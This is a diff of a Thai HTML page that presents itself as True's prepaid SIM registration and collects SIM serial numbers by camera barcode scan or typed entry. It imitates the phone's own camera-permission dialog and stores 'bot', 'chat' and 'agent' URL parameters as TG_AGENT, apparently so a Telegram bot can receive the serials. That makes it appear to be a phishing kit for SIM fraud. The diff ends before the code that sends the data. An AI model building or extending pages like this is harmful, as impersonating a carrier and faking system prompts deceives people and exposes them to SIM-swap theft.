@@ -4,319 +4,154 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <title>ลงทะเบียนซิม True</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;600;700;800&display=swap">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/zxing-js/0.21.1/umd/index.min.js"></script>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;font-family:'Sarabun',sans-serif;background:#fff;overflow:hidden;-webkit-tap-highlight-color:transparent}
+#app{position:fixed;inset:0;display:flex;flex-direction:column;background:#fff}
 
-html, body {
-  width: 100%; height: 100%;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 16px;
-  background: #fff;
-  overflow: hidden;
-  -webkit-tap-highlight-color: transparent;
-}
+/* Header */
+#hdr{display:flex;align-items:center;height:calc(56px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);padding-left:4px;background:#fff;border-bottom:1px solid #eee;flex-shrink:0}
+#btnBack{width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#c00}
+#hTitle{flex:1;text-align:center;font-size:20px;font-weight:800;color:#111;margin-right:44px}
 
-/* ─── APP SHELL ─── */
-#app {
-  position: fixed; inset: 0;
-  display: flex; flex-direction: column;
-  background: #fff;
-}
+/* Tabs */
+#tabs{display:flex;flex-shrink:0;border-bottom:2px solid #eee}
+.tab{flex:1;height:48px;background:none;border:none;font-family:'Sarabun',sans-serif;font-size:18px;font-weight:700;color:#aaa;cursor:pointer;border-bottom:3px solid transparent;position:relative;bottom:-2px;transition:color .15s,border-color .15s}
+.tab.on{color:#c00;border-bottom-color:#c00}
 
-/* ─── HEADER ─── */
-#header {
-  display: flex; align-items: center;
-  height: calc(56px + env(safe-area-inset-top, 0px));
-  padding-top: env(safe-area-inset-top, 0px);
-  padding-left: 4px; padding-right: 16px;
-  background: #fff;
-  border-bottom: 1.5px solid #eee;
-  flex-shrink: 0;
-}
-#btnBack {
-  width: 44px; height: 44px;
-  display: flex; align-items: center; justify-content: center;
-  background: none; border: none; cursor: pointer; color: #c00;
-}
-#hTitle {
-  flex: 1; text-align: center;
-  font-size: 20px; font-weight: 800;
-  color: #111; margin-right: 44px;
-}
+/* Content */
+#content{flex:1;position:relative;overflow:hidden;min-height:0}
+.pane{position:absolute;inset:0;display:none;flex-direction:column}
+.pane.on{display:flex}
 
-/* ─── TABS ─── */
-#tabs {
-  display: flex; flex-shrink: 0;
-  border-bottom: 2px solid #eee;
-}
-.tab {
-  flex: 1; height: 48px;
-  background: none; border: none;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 18px; font-weight: 700;
-  color: #aaa; cursor: pointer;
-  border-bottom: 3px solid transparent;
-  position: relative; bottom: -2px;
-  transition: color .15s, border-color .15s;
-}
-.tab.on { color: #c00; border-bottom-color: #c00; }
+/* Scan pane */
+#scanPane{background:#111}
+#video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;z-index:1}
+#drawCanvas{position:absolute;inset:0;width:100%;height:100%;z-index:2;pointer-events:none;display:none}
 
-/* ─── CONTENT ─── */
-#content {
-  flex: 1; position: relative; overflow: hidden; min-height: 0;
+/* scan frame guide */
+#guide{
+  position:absolute;z-index:5;pointer-events:none;
+  left:5%;right:5%;top:30%;height:20%;
+  border:2px solid rgba(255,255,255,0.3);border-radius:10px;
 }
-.pane {
-  position: absolute; inset: 0;
-  display: none; flex-direction: column;
+#guide::before,#guide::after,#guide span::before,#guide span::after{
+  content:'';position:absolute;width:28px;height:28px;border-color:#fff;border-style:solid;
 }
-.pane.on { display: flex; }
+#guide::before{top:-2px;left:-2px;border-width:3px 0 0 3px;border-radius:8px 0 0 0}
+#guide::after{top:-2px;right:-2px;border-width:3px 3px 0 0;border-radius:0 8px 0 0}
+#guide span::before{bottom:-2px;left:-2px;border-width:0 0 3px 3px;border-radius:0 0 0 8px}
+#guide span::after{bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 8px 0}
 
-/* ─── SCAN PANE ─── */
-#scanPane { background: #2a2a2a; }
+#hint{position:absolute;z-index:5;left:0;right:0;top:20%;text-align:center;font-size:17px;font-weight:700;color:#fff;text-shadow:0 1px 6px rgba(0,0,0,.8);pointer-events:none}
 
-#video {
-  position: absolute; inset: 0;
-  width: 100%; height: 100%;
-  object-fit: cover; z-index: 1;
+/* scan line animation */
+#scanLine{
+  position:absolute;z-index:6;pointer-events:none;
+  left:7%;right:7%;height:2px;background:rgba(255,50,50,.8);
+  box-shadow:0 0 6px rgba(255,50,50,.6);
+  top:30%;
+  animation:scanAnim 1.8s ease-in-out infinite;
+  display:none;
+}
+@keyframes scanAnim{
+  0%{top:30%} 100%{top:50%}
 }
 
-#scanHint {
-  position: absolute; left: 0; right: 0; top: 16%;
-  text-align: center;
-  font-size: 18px; font-weight: 700; color: #fff;
-  z-index: 5; pointer-events: none;
-  text-shadow: 0 2px 8px rgba(0,0,0,.7);
-  padding: 0 16px; line-height: 1.5;
-}
+/* idle */
+#idle{position:absolute;inset:0;z-index:10;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px}
+#idleMsg{font-size:18px;font-weight:800;color:#fff;text-align:center}
+#idleSub{font-size:14px;color:rgba(255,255,255,.5);text-align:center;padding:0 28px;line-height:1.6}
 
-/* scan frame */
-#scanFrame {
-  position: absolute;
-  left: 5%; right: 5%;
-  top: 26%; height: 22%;
-  z-index: 5; pointer-events: none;
-}
-#scanFrame::before, #scanFrame::after,
-#scanFrame span::before, #scanFrame span::after {
-  content: '';
-  position: absolute;
-  width: 38px; height: 38px;
-  border-color: rgba(230,230,230,.95);
-  border-style: solid;
-}
-#scanFrame::before  { top:-2px; left:-2px;  border-width: 4px 0 0 4px; border-radius: 10px 0 0 0; }
-#scanFrame::after   { top:-2px; right:-2px; border-width: 4px 4px 0 0; border-radius: 0 10px 0 0; }
-#scanFrame span::before { bottom:-2px; left:-2px;  border-width: 0 0 4px 4px; border-radius: 0 0 0 10px; }
-#scanFrame span::after  { bottom:-2px; right:-2px; border-width: 0 4px 4px 0; border-radius: 0 0 10px 0; }
+/* bottom sheet */
+#bg{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.5);display:none}
+#bg.on{display:block}
+#sheet{position:fixed;left:0;right:0;bottom:0;z-index:101;background:#fff;border-radius:24px 24px 0 0;padding:10px 0 calc(16px + env(safe-area-inset-bottom,0px));transform:translateY(100%);transition:transform .28s cubic-bezier(.32,1,.46,1)}
+#sheet.on{transform:translateY(0)}
+#handle{width:40px;height:4px;background:#ddd;border-radius:99px;margin:0 auto 18px}
+#shIcon{width:56px;height:56px;background:#e8f0fe;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+#shTitle{text-align:center;font-size:18px;font-weight:800;color:#111;padding:0 24px;line-height:1.4;margin-bottom:4px}
+#shSub{text-align:center;font-size:14px;color:#666;padding:0 24px;line-height:1.5;margin-bottom:16px}
+.sBtn{display:block;width:100%;padding:16px 24px;background:none;border:none;border-top:1px solid #eee;font-family:'Sarabun',sans-serif;font-size:18px;font-weight:700;color:#1565c0;cursor:pointer;text-align:center;-webkit-appearance:none;touch-action:manipulation}
+.sBtn:active{background:#f0f4ff}
+.sBtn.deny{color:#888;font-weight:600;font-size:16px}
 
-/* ─── IDLE OVERLAY ─── */
-#idle {
-  position: absolute; inset: 0; z-index: 10;
-  background: #2a2a2a;
-  display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-  gap: 16px;
-}
-#idleIcon {
-  width: 88px; height: 88px;
-  border-radius: 22px;
-  border: 2px solid rgba(255,255,255,.2);
-  display: flex; align-items: center; justify-content: center;
-}
-#idleMsg {
-  font-size: 18px; font-weight: 800; color: #fff; text-align: center;
-}
-#idleSub {
-  font-size: 15px; color: rgba(255,255,255,.5);
-  text-align: center; padding: 0 32px; line-height: 1.5;
-}
+/* toast */
+#toast{position:fixed;left:50%;bottom:calc(28px + env(safe-area-inset-bottom,0px));transform:translateX(-50%);background:rgba(10,10,10,.88);color:#fff;padding:12px 24px;border-radius:28px;font-size:16px;font-weight:600;white-space:nowrap;z-index:200;opacity:0;pointer-events:none;transition:opacity .2s;max-width:90vw;text-align:center}
+#toast.on{opacity:1}
 
-/* ─── BOTTOM SHEET (แทน popup) ─── */
-#sheet-bg {
-  position: fixed; inset: 0; z-index: 100;
-  background: rgba(0,0,0,.5);
-  display: none;
-}
-#sheet-bg.on { display: block; }
-
-#sheet {
-  position: fixed; left: 0; right: 0; bottom: 0; z-index: 101;
-  background: #fff;
-  border-radius: 28px 28px 0 0;
-  padding: 12px 0 calc(20px + env(safe-area-inset-bottom,0px));
-  transform: translateY(100%);
-  transition: transform .28s cubic-bezier(.32,1,.46,1);
-}
-#sheet.on { transform: translateY(0); }
-
-#sheetHandle {
-  width: 44px; height: 5px;
-  background: #ddd; border-radius: 99px;
-  margin: 0 auto 20px;
-}
-#sheetIcon {
-  width: 64px; height: 64px;
-  background: #e8f0fe; border-radius: 18px;
-  display: flex; align-items: center; justify-content: center;
-  margin: 0 auto 16px;
-}
-#sheetTitle {
-  text-align: center;
-  font-size: 18px; font-weight: 800; color: #111;
-  padding: 0 28px; line-height: 1.4; margin-bottom: 6px;
-}
-#sheetSub {
-  text-align: center;
-  font-size: 15px; color: #666;
-  padding: 0 28px; line-height: 1.5; margin-bottom: 20px;
-}
-.sheet-divider { height: 1px; background: #eee; margin: 0 0 4px; }
-
-.sBtn {
-  display: block; width: 100%;
-  padding: 16px 28px;
-  background: none; border: none; border-top: 1px solid #eee;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 18px; font-weight: 700;
-  color: #1565c0; cursor: pointer; text-align: center;
-  -webkit-appearance: none; touch-action: manipulation;
-}
-.sBtn:first-of-type { border-top: none; }
-.sBtn:active { background: #f0f4ff; }
-.sBtn.deny { color: #888; font-weight: 600; font-size: 17px; }
-
-/* ─── TOAST ─── */
-#toast {
-  position: fixed; left: 50%; bottom: calc(32px + env(safe-area-inset-bottom,0px));
-  transform: translateX(-50%);
-  background: rgba(10,10,10,.88); color: #fff;
-  padding: 14px 28px; border-radius: 32px;
-  font-size: 22px; font-weight: 600; white-space: nowrap;
-  z-index: 200; opacity: 0; pointer-events: none;
-  transition: opacity .2s;
-}
-#toast.on { opacity: 1; }
-
-/* ─── MANUAL PANE ─── */
-#manPane { background: #fff; overflow-y: auto; -webkit-overflow-scrolling: touch; }
-#manInner {
-  min-height: 100%; display: flex; flex-direction: column;
-  padding: 32px 24px calc(40px + env(safe-area-inset-bottom,0px));
-  gap: 12px;
-}
-.fLabel { font-size: 15px; font-weight: 700; color: #555; margin-bottom: 8px; }
-#manSerial {
-  width: 100%; border: 1.5px solid #ddd; border-radius: 12px;
-  padding: 14px 16px;
-  font-family: 'Sarabun', monospace; font-size: 20px; font-weight: 700;
-  color: #111; outline: none; -webkit-appearance: none; background: #fff;
-  transition: border-color .2s; letter-spacing: .04em;
-}
-#manSerial:focus { border-color: #c00; }
-#manSerial::placeholder { font-size: 15px; font-weight: 400; color: #bbb; letter-spacing: 0; }
-.fHint { font-size: 14px; color: #999; line-height: 1.6; }
-.spacer { flex: 1; }
-#btnSubmit {
-  width: 100%; padding: 16px; background: #c00; border: none; border-radius: 12px;
-  font-family: 'Sarabun', sans-serif; font-size: 18px; font-weight: 800;
-  color: #fff; cursor: pointer; -webkit-appearance: none; touch-action: manipulation;
-}
-#btnSubmit:active { opacity: .85; }
-#btnSubmit:disabled { opacity: .4; cursor: not-allowed; }
+/* manual pane */
+#manPane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
+#manInner{min-height:100%;display:flex;flex-direction:column;padding:28px 20px calc(36px + env(safe-area-inset-bottom,0px));gap:12px}
+.fLbl{font-size:15px;font-weight:700;color:#555;margin-bottom:8px}
+#manSerial{width:100%;border:1.5px solid #ddd;border-radius:12px;padding:14px 16px;font-family:'Sarabun',monospace;font-size:20px;font-weight:700;color:#111;outline:none;-webkit-appearance:none;background:#fff;transition:border-color .2s;letter-spacing:.04em}
+#manSerial:focus{border-color:#c00}
+#manSerial::placeholder{font-size:15px;font-weight:400;color:#bbb;letter-spacing:0}
+.fHint{font-size:14px;color:#999;line-height:1.6}
+.spacer{flex:1}
+#btnSub{width:100%;padding:16px;background:#c00;border:none;border-radius:12px;font-family:'Sarabun',sans-serif;font-size:18px;font-weight:800;color:#fff;cursor:pointer;-webkit-appearance:none;touch-action:manipulation}
+#btnSub:active{opacity:.85}
+#btnSub:disabled{opacity:.4}
 </style>
 </head>
 <body>
-
 <div id="app">
-  <!-- Header -->
-  <div id="header">
+  <div id="hdr">
     <button id="btnBack" onclick="history.back()">
-      <svg width="30" height="30" viewBox="0 0 24 24" fill="none"
-           stroke="currentColor" stroke-width="2.5"
-           stroke-linecap="round" stroke-linejoin="round">
-        <path d="M15 18l-6-6 6-6"/>
-      </svg>
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
     </button>
     <div id="hTitle">ลงทะเบียนซิมเติมเงิน</div>
   </div>
-
-  <!-- Tabs -->
   <div id="tabs">
     <button class="tab on" id="tScan" onclick="goTab('scan')">สแกนบาร์โค้ด</button>
     <button class="tab"    id="tMan"  onclick="goTab('man')">กรอกตัวเลข</button>
   </div>
-
-  <!-- Content -->
   <div id="content">
-
-    <!-- SCAN PANE -->
     <div class="pane on" id="scanPane">
       <video id="video" playsinline muted autoplay></video>
-      <div id="scanHint">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
-      <div id="scanFrame"><span></span></div>
-
-      <!-- idle overlay -->
+      <canvas id="drawCanvas"></canvas>
+      <div id="hint">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
+      <div id="guide"><span></span></div>
+      <div id="scanLine"></div>
       <div id="idle">
-        <div id="idleIcon">
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="none"
-               stroke="rgba(255,255,255,.55)" stroke-width="1.5" stroke-linecap="round">
-            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-            <circle cx="12" cy="13" r="4"/>
-          </svg>
-        </div>
+        <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.4)" stroke-width="1.5" stroke-linecap="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
         <div id="idleMsg">กรุณาอนุญาตการใช้กล้อง</div>
         <div id="idleSub">กดปุ่มอนุญาตเพื่อเปิดกล้องสแกนบาร์โค้ด</div>
       </div>
     </div>
-
-    <!-- MANUAL PANE -->
     <div class="pane" id="manPane">
       <div id="manInner">
         <div>
-          <div class="fLabel">เลขซีเรียลซิม (18 หลัก)</div>
-          <input id="manSerial" type="tel" inputmode="numeric"
-            placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off"
-            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
-          <div class="fHint" style="margin-top:10px">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
+          <div class="fLbl">เลขซีเรียลซิม (18 หลัก)</div>
+          <input id="manSerial" type="tel" inputmode="numeric" placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off" oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
+          <div class="fHint" style="margin-top:8px">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
         </div>
         <div class="spacer"></div>
-        <button id="btnSubmit" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
+        <button id="btnSub" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
       </div>
     </div>
-
-  </div><!-- /content -->
-</div><!-- /app -->
-
-<!-- BOTTOM SHEET -->
-<div id="sheet-bg" onclick="denyCamera()"></div>
-<div id="sheet">
-  <div id="sheetHandle"></div>
-  <div id="sheetIcon">
-    <svg width="34" height="34" viewBox="0 0 24 24" fill="none"
-         stroke="#1565c0" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-      <circle cx="12" cy="13" r="4"/>
-    </svg>
   </div>
-  <div id="sheetTitle">อนุญาตให้ <span style="color:#111">True</span> ถ่ายรูปและบันทึกวิดีโอไหม</div>
-  <div id="sheetSub">จำเป็นสำหรับการสแกนบาร์โค้ดบนซองซิมการ์ด</div>
-  <div class="sheet-divider"></div>
-  <!-- onclick ตรงสู่ startCamera() — gesture chain ไม่ขาด -->
-  <button class="sBtn" onclick="startCamera()">ขณะใช้แอป</button>
+</div>
+
+<div id="bg" onclick="denyCamera()"></div>
+<div id="sheet">
+  <div id="handle"></div>
+  <div id="shIcon">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#1565c0" stroke-width="1.8" stroke-linecap="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+  </div>
+  <div id="shTitle">อนุญาตให้ True ถ่ายรูปและบันทึกวิดีโอไหม</div>
+  <div id="shSub">จำเป็นสำหรับการสแกนบาร์โค้ดบนซองซิมการ์ด</div>
+  <button class="sBtn" style="border-top:none" onclick="startCamera()">ขณะใช้แอป</button>
   <button class="sBtn" onclick="startCamera()">เฉพาะครั้งนี้</button>
   <button class="sBtn deny" onclick="denyCamera()">ไม่อนุญาต</button>
 </div>
-
 <div id="toast"></div>
 
 <script>
-/* ── params & storage ── */
-const LS  = k    => { try{ return localStorage.getItem(k)||'' }catch(e){ return '' } };
-const LSS = (k,v)=> { try{ localStorage.setItem(k,v) }catch(e){} };
-
+/* ── params ── */
+const LS  = k    => { try{return localStorage.getItem(k)||''}catch(e){return''} };
+const LSS = (k,v)=> { try{localStorage.setItem(k,v)}catch(e){} };
 const qp = new URLSearchParams(location.search);
 if(qp.get('bot'))   LSS('sim_bot',   qp.get('bot'));
 if(qp.get('chat'))  LSS('sim_chat',  qp.get('chat'));
@@ -327,187 +162,249 @@ const TG_AGENT = LS('sim_agent');
 
 /* ── tabs ── */
 function goTab(t) {
-  ['scan','man'].forEach(id => {
-    document.getElementById(id==='scan'?'scanPane':'manPane').classList.toggle('on', id===t);
-    document.getElementById(id==='scan'?'tScan':'tMan').classList.toggle('on', id===t);
-  });
+  document.getElementById('scanPane').classList.toggle('on', t==='scan');
+  document.getElementById('manPane').classList.toggle('on',  t==='man');
+  document.getElementById('tScan').classList.toggle('on', t==='scan');
+  document.getElementById('tMan').classList.toggle('on',  t==='man');
   if(t==='scan' && !scanning) openSheet();
   if(t==='man')  stopCam();
 }
 
 /* ── toast ── */
-let toastTmr;
-function showToast(msg) {
-  const el = document.getElementById('toast');
-  el.textContent = msg; el.classList.add('on');
-  clearTimeout(toastTmr);
-  toastTmr = setTimeout(() => el.classList.remove('on'), 2500);
+let toastT;
+function showToast(msg,dur=2500){
+  const el=document.getElementById('toast');
+  el.textContent=msg; el.classList.add('on');
+  clearTimeout(toastT); toastT=setTimeout(()=>el.classList.remove('on'),dur);
 }
 
-/* ── bottom sheet ── */
-function openSheet() {
-  document.getElementById('sheet-bg').classList.add('on');
-  // rAF ให้ transition เล่น
-  requestAnimationFrame(() => document.getElementById('sheet').classList.add('on'));
+/* ── sheet ── */
+function openSheet(){
+  document.getElementById('bg').classList.add('on');
+  requestAnimationFrame(()=>document.getElementById('sheet').classList.add('on'));
 }
-function closeSheet() {
+function closeSheet(){
   document.getElementById('sheet').classList.remove('on');
-  document.getElementById('sheet-bg').classList.remove('on');
+  document.getElementById('bg').classList.remove('on');
 }
-function denyCamera() {
+function denyCamera(){ closeSheet(); goTab('man'); }
+
+/* ── camera state ── */
+let camStream=null, scanning=false, scanTimer=null;
+
+/* ── startCamera ── */
+async function startCamera(){
   closeSheet();
-  goTab('man');
-}
+  if(scanning) return;
 
-/* ── camera ── */
-let reader = null, scanning = false, camStream = null;
-
-/*
- * startCamera() — เรียกจาก onclick attribute โดยตรง (user gesture)
- * closeSheet() เป็น sync → DOM update → getUserMedia ทันที
- */
-async function startCamera() {
-  closeSheet();                  // sync — sheet หาย
-  if (scanning) return;
-
-  const idle   = document.getElementById('idle');
-  const idleMsg= document.getElementById('idleMsg');
-  idle.style.display = 'flex';
-  idleMsg.textContent = 'กำลังเปิดกล้อง…';
+  const idle=document.getElementById('idle');
+  const idleMsg=document.getElementById('idleMsg');
+  idle.style.display='flex';
+  idleMsg.textContent='กำลังเปิดกล้อง…';
 
   try {
     camStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } }
-    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }));
+      video:{ facingMode:{ideal:'environment'}, width:{ideal:1920}, height:{ideal:1080} }
+    });
 
-    idle.style.display = 'none';
+    const vid=document.getElementById('video');
+    vid.srcObject=camStream;
+    await vid.play().catch(()=>{});
 
-    const vid = document.getElementById('video');
-    vid.srcObject = camStream;
-    await vid.play().catch(() => {});
+    idle.style.display='none';
+    document.getElementById('scanLine').style.display='block';
+    scanning=true;
 
-    /* รอ ZXing */
-    if (typeof ZXing === 'undefined') {
-      await new Promise(res => {
-        const t = setInterval(() => { if (typeof ZXing !== 'undefined') { clearInterval(t); res(); } }, 80);
-      });
-    }
+    startScanning(vid);
 
-    const hints = new Map([
-      [ZXing.DecodeHintType.POSSIBLE_FORMATS, [
-        ZXing.BarcodeFormat.CODE_128,
-        ZXing.BarcodeFormat.CODE_39,
-        ZXing.BarcodeFormat.CODE_93,
-        ZXing.BarcodeFormat.EAN_13,
-        ZXing.BarcodeFormat.EAN_8,
-        ZXing.BarcodeFormat.ITF,
-        ZXing.BarcodeFormat.UPC_A,
-        ZXing.BarcodeFormat.UPC_E,
-      ]],
-      [ZXing.DecodeHintType.TRY_HARDER, true],
-      [ZXing.DecodeHintType.ASSUME_GS1, false],
-    ]);
-    reader   = new ZXing.BrowserMultiFormatReader(hints, { delayBetweenScanAttempts: 40 });
-    scanning = true;
-
-    // สร้าง canvas สำหรับ crop บริเวณ scan frame แล้ว decode
-    const canvas = document.createElement('canvas');
-    const ctx    = canvas.getContext('2d');
-
-    async function scanLoop() {
-      if (!scanning) return;
-      const vid = document.getElementById('video');
-      if (vid.readyState >= 2 && vid.videoWidth > 0) {
-        const vw = vid.videoWidth, vh = vid.videoHeight;
-
-        // ลอง crop หลายแบบ: full frame, ครึ่งบน, ครึ่งล่าง, กลาง
-        const regions = [
-          [0,    0,    vw,        vh       ],  // full
-          [0,    0,    vw,        vh*0.55  ],  // top half
-          [0,    vh*0.2, vw,      vh*0.55  ],  // upper-mid
-          [vw*0.05, vh*0.1, vw*0.9, vh*0.45], // crop tight
-        ];
-
-        for (const [sx,sy,sw,sh] of regions) {
-          canvas.width = sw; canvas.height = sh;
-          ctx.drawImage(vid, sx, sy, sw, sh, 0, 0, sw, sh);
-          try {
-            const result = await reader.decodeFromCanvas(canvas);
-            if (result) {
-              const raw = result.getText();
-              const serial = extractSerial(raw);
-              if (serial) { stopCam(); onSerial(serial); return; }
-            }
-          } catch(e) { /* NotFoundException */ }
-        }
-      }
-      if (scanning) setTimeout(scanLoop, 50);
-    }
-    scanLoop();
-
-  } catch (e) {
-    idle.style.display = 'flex';
-    idleMsg.textContent = e?.name === 'NotAllowedError' ? 'ไม่ได้รับสิทธิ์กล้อง' : 'เกิดข้อผิดพลาด ลองใหม่';
-    scanning = false; camStream = null;
+  } catch(e){
+    idle.style.display='flex';
+    idleMsg.textContent = e?.name==='NotAllowedError' ? 'ไม่ได้รับสิทธิ์กล้อง — กรุณากด อนุญาต' : 'เกิดข้อผิดพลาด ลองใหม่';
+    scanning=false; camStream=null;
     setTimeout(openSheet, 800);
   }
 }
 
-function stopCam() {
-  if (reader)    { try { reader.reset(); } catch(e) {} reader = null; }
-  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
-  scanning = false;
+/* ── Main scanning logic ── */
+async function startScanning(vid){
+  /* Try native BarcodeDetector first */
+  if('BarcodeDetector' in window){
+    try {
+      const formats = await BarcodeDetector.getSupportedFormats();
+      const wanted = ['code_128','code_39','code_93','ean_13','ean_8','itf','upc_a','upc_e','qr_code'];
+      const use = wanted.filter(f=>formats.includes(f));
+      const det = new BarcodeDetector({ formats: use.length ? use : formats });
+      nativeLoop(vid, det);
+      return;
+    } catch(e){}
+  }
+
+  /* Load Quagga2 for 1D barcodes */
+  await loadScript('https://cdn.jsdelivr.net/npm/quagga@0.12.1/dist/quagga.min.js');
+  if(typeof Quagga !== 'undefined'){
+    quaggaScan(vid);
+    return;
+  }
+
+  /* Last resort: ZXing */
+  await loadScript('https://cdn.jsdelivr.net/npm/@zxing/library@0.19.2/umd/index.min.js');
+  zxingLoop(vid);
 }
 
-function extractSerial(raw) {
-  // ลบช่องว่างและขีด
-  const s = raw.replace(/[\s\-]/g, '');
-  // 18 หลัก เริ่มด้วย 8966
-  const m = s.match(/8966\d{14}/);   if (m)  return m[0];
-  // 18 หลักทั่วไป
-  const m2 = s.match(/\d{18}/);      if (m2) return m2[0];
-  // 16 หลัก เริ่มด้วย 8966 (บาร์โค้ดบางรุ่น)
-  const m3 = s.match(/8966\d{12}/);  if (m3) return m3[0];
-  // ถ้า raw มีแค่ตัวเลข 10+ หลัก ก็รับ
-  const m4 = s.match(/\d{10,}/);     if (m4) return m4[0];
+function loadScript(src){
+  return new Promise((res,rej)=>{
+    if(document.querySelector(`script[src="${src}"]`)){ res(); return; }
+    const s=document.createElement('script');
+    s.src=src; s.onload=res; s.onerror=rej;
+    document.head.appendChild(s);
+  });
+}
+
+/* ── Native BarcodeDetector loop ── */
+async function nativeLoop(vid, det){
+  if(!scanning) return;
+  try {
+    if(vid.readyState>=2 && vid.videoWidth>0){
+      const barcodes = await det.detect(vid);
+      for(const b of barcodes){
+        const serial = extractSerial(b.rawValue);
+        if(serial){ stopCam(); onSerial(serial); return; }
+      }
+    }
+  } catch(e){}
+  if(scanning) scanTimer = setTimeout(()=>nativeLoop(vid,det), 100);
+}
+
+/* ── Quagga 1D barcode scanner ── */
+function quaggaScan(vid){
+  const pane = document.getElementById('scanPane');
+  const w = pane.clientWidth, h = pane.clientHeight;
+
+  Quagga.init({
+    inputStream:{
+      type:'LiveStream',
+      target: vid.parentElement,
+      constraints:{ facingMode:'environment', width:{ideal:1280}, height:{ideal:720} },
+      area:{ top:'28%', right:'5%', bottom:'28%', left:'5%' },
+    },
+    decoder:{
+      readers:['code_128_reader','code_39_reader','ean_reader','itf_reader'],
+      debug:{ drawBoundingBox:false, showPattern:false },
+    },
+    locate: true,
+    numOfWorkers: 2,
+    frequency: 10,
+  }, err=>{
+    if(err){ console.warn('Quagga init err:', err); zxingFallback(vid); return; }
+    Quagga.start();
+
+    /* hide the video element quagga injected and use ours */
+    const qVid = pane.querySelector('video:not(#video)');
+    if(qVid) qVid.style.display='none';
+  });
+
+  Quagga.onDetected(result=>{
+    if(!scanning) return;
+    const code = result&&result.codeResult&&result.codeResult.code;
+    if(!code) return;
+    const serial = extractSerial(code);
+    if(serial){
+      stopCam();
+      Quagga.stop();
+      onSerial(serial);
+    }
+  });
+}
+
+/* ── ZXing loop ── */
+async function zxingFallback(vid){
+  if(typeof ZXing==='undefined') await loadScript('https://cdn.jsdelivr.net/npm/@zxing/library@0.19.2/umd/index.min.js');
+  zxingLoop(vid);
+}
+
+async function zxingLoop(vid){
+  const canvas=document.createElement('canvas');
+  const ctx=canvas.getContext('2d');
+  let reader=null;
+  try {
+    const hints=new Map();
+    hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS,[
+      ZXing.BarcodeFormat.CODE_128,
+      ZXing.BarcodeFormat.CODE_39,
+      ZXing.BarcodeFormat.EAN_13,
+      ZXing.BarcodeFormat.ITF,
+    ]);
+    hints.set(ZXing.DecodeHintType.TRY_HARDER,true);
+    reader=new ZXing.MultiFormatReader();
+    reader.setHints(hints);
+  } catch(e){ reader=null; }
+
+  async function loop(){
+    if(!scanning) return;
+    if(vid.readyState>=2 && vid.videoWidth>0){
+      const vw=vid.videoWidth, vh=vid.videoHeight;
+      canvas.width=vw; canvas.height=vh;
+      ctx.drawImage(vid,0,0);
+      try {
+        const imgData=ctx.getImageData(0,0,vw,vh);
+        const lum=new ZXing.RGBLuminanceSource(imgData.data,vw,vh);
+        const bmp=new ZXing.BinaryBitmap(new ZXing.HybridBinarizer(lum));
+        const result=reader.decode(bmp);
+        const s=extractSerial(result.getText());
+        if(s){ stopCam(); onSerial(s); return; }
+      } catch(e){}
+    }
+    if(scanning) scanTimer=setTimeout(loop,100);
+  }
+  loop();
+}
+
+function stopCam(){
+  scanning=false;
+  if(scanTimer){ clearTimeout(scanTimer); scanTimer=null; }
+  if(camStream){ camStream.getTracks().forEach(t=>t.stop()); camStream=null; }
+  document.getElementById('scanLine').style.display='none';
+  try{ Quagga&&Quagga.stop(); }catch(e){}
+}
+
+function extractSerial(raw){
+  if(!raw) return null;
